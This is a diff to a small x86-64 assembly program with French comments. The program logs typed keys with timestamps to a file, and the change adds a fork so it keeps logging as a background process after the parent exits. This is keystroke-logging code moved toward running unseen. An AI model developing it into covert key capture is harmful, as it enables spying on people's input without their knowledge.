@@ -4,6 +4,7 @@ section .data
     time_buf db 64 dup(0)     ; buffer pour le timestamp
     newline db 0xa            ; retour ligne
     sep db " | ", 0           ; separateur
+    daemon_pid dq 0           ; pid du processus enfant
 
 section .bss
     buffer resb 1              ; buffer pour la touche
@@ -13,19 +14,29 @@ section .text
 global _start
 
 _start:
-    ; ouverture fichier
-    mov rax, 2                 ; open
-    mov rdi, filename
-    mov rsi, 102o             ; append + create + write
-    mov rdx, 0644o            ; perms
+    ; fork pour daemonize
+    mov rax, 57               ; sys_fork
     syscall
     
-    mov [fd], rax             ; save fd
+    cmp rax, 0
+    je child                  ; processus enfant
+    mov [daemon_pid], rax     ; sauvegarde pid enfant
+    jmp parent               
+
+child:
+    ; ouverture fichier
+    mov rax, 2                ; open
+    mov rdi, filename
+    mov rsi, 102o            ; append + create + write
+    mov rdx, 0644o           ; perms
+    syscall
+    
+    mov [fd], rax            ; save fd
 
 read_loop:
     ; recup timestamp
-    mov rax, 228              ; clock_gettime
-    mov rdi, 0                ; CLOCK_REALTIME
+    mov rax, 228             ; clock_gettime
+    mov rdi, 0               ; CLOCK_REALTIME
     mov rsi, timespec
     syscall
 
@@ -36,9 +47,9 @@ read_loop:
     mov rdx, 1                
     syscall
 
-    ; verifie fin
-    cmp rax, 0
-    jle exit
+    ; check si 'q' pour quitter
+    cmp byte [buffer], 'q'
+    je exit
 
     ; timestamp
     mov rax, [timespec]
@@ -49,7 +60,7 @@ read_loop:
     mov rax, 1                
     mov rdi, [fd]
     mov rsi, time_buf
-    mov rdx, 20               ; longueur timestamp
+    mov rdx, 20              
     syscall
 
     ; ecrit sep
@@ -74,6 +85,12 @@ read_loop:
     syscall
 
     jmp read_loop
+
+parent:
+    ; parent sort direct
+    mov rax, 60              
+    xor rdi, rdi
+    syscall
 
 exit:
     ; ferme fichier
